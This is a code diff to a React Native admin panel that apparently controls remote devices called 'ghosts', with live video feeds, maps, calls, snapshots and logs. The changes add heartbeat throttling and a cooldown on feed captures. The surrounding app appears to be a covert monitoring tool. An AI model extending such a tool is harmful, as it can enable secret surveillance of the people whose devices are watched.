@@ -18,18 +18,32 @@ const AdminScreen = ({ onLogout, name }) => {
   const [logs, setLogs] = useState([]);
   const [selectedGhostId, setSelectedGhostId] = useState(null);
   const [activeTab, setActiveTab] = useState('FEED'); // FEED, MAP, SNAPS, CALLS, LOGS
+  const [isCapturing, setIsCapturing] = useState(false);
   const viewRef = useRef();
   const feedRef = useRef();
+  const heartbeatCache = useRef({});
 
   const selectedGhost = selectedGhostId ? ghosts[selectedGhostId] : null;
 
   useEffect(() => {
     socket.on('heartbeat_update', (data) => {
-      setGhosts(prev => ({ 
-        ...prev, 
-        [data.name]: { ...prev[data.name], ...data, lastSeen: Date.now() } 
-      }));
+      // Performance Throttle: Update cache, update state only on interval or small batch
+      heartbeatCache.current[data.name] = { ...data, lastSeen: Date.now() };
     });
+
+    // Dedicated performance loop for state syncing (Reduce re-renders)
+    const syncInterval = setInterval(() => {
+      if (Object.keys(heartbeatCache.current).length > 0) {
+        setGhosts(prev => {
+          const newState = { ...prev };
+          Object.keys(heartbeatCache.current).forEach(node => {
+            newState[node] = { ...prev[node], ...heartbeatCache.current[node] };
+          });
+          heartbeatCache.current = {}; // Flush cache
+          return newState;
+        });
+      }
+    }, 800); // Sync every 800ms for visual smoothness vs performance balance
     
     socket.on('status_report', (data) => {
       console.log("[Admin] Received Status Report", data);
@@ -96,6 +110,7 @@ const AdminScreen = ({ onLogout, name }) => {
     });
 
     return () => {
+      clearInterval(syncInterval);
       socket.off('heartbeat_update');
       socket.off('log_update');
       socket.off('ghost_activity');
@@ -116,19 +131,20 @@ const AdminScreen = ({ onLogout, name }) => {
   };
 
   const captureLocalView = async (targetRef, typeLabel = "DASHBOARD") => {
+    if (isCapturing) return; // Prevention: No double-capture
+
     try {
+      setIsCapturing(true); // Tactical Delay Active
       const { status } = await MediaLibrary.requestPermissionsAsync();
       if (status !== 'granted') {
         Alert.alert("Permission", "Storage access required to save screenshot.");
         return;
       }
 
-      // Use specific ref (like feed) or fallback to full viewRef
       const captureTarget = (targetRef && targetRef.current) ? targetRef : viewRef;
-      
       const uri = await captureRef(captureTarget, {
         format: 'jpg',
-        quality: 0.9,
+        quality: 0.95, // High quality as requested
       });
 
       const nodeInfo = selectedGhost ? selectedGhost.name.replace(/[^a-z0-9]/gi, '_').toUpperCase() : 'NONE';
@@ -139,9 +155,13 @@ const AdminScreen = ({ onLogout, name }) => {
       
       Vibration.vibrate([0, 50, 50, 50]);
       Alert.alert(`${typeLabel} PRESERVED`, `Manifest: ${filename}`);
+      
+      // Cooldown timer to prevent storage/CPU bottleneck
+      setTimeout(() => setIsCapturing(false), 2000); 
     } catch (e) {
       console.error("Local capture failed", e);
-      Alert.alert("Error", "Feed capture failed. Ensure stream is active before capturing.");
+      Alert.alert("Error", "Feed capture failed. Ensure stream is active.");
+      setIsCapturing(false);
     }
   };
 
@@ -216,9 +236,13 @@ const AdminScreen = ({ onLogout, name }) => {
                   <VideoFeed ghostName={selectedGhost.name} adminName={name} />
                 </View>
                 <View style={styles.controls}>
-                  <TouchableOpacity style={styles.btn} onPress={() => captureLocalView(feedRef, "FEED")}>
+                  <TouchableOpacity 
+                    style={[styles.btn, isCapturing && { opacity: 0.5 }]} 
+                    onPress={() => captureLocalView(feedRef, "FEED")}
+                    disabled={isCapturing}
+                  >
                     <MaterialCommunityIcons name="camera-plus" size={18} color="#00ff00" style={{ marginRight: 10 }} />
-                    <Text style={styles.btnTxt}>CAPTURE LIVE FEED</Text>
+                    <Text style={styles.btnTxt}>{isCapturing ? "PRESERVING..." : "CAPTURE LIVE FEED"}</Text>
                   </TouchableOpacity>
                   
                   <TouchableOpacity style={[styles.btn]} onPress={() => sendCommand(selectedGhost.name, 'SNAPSHOT')}>
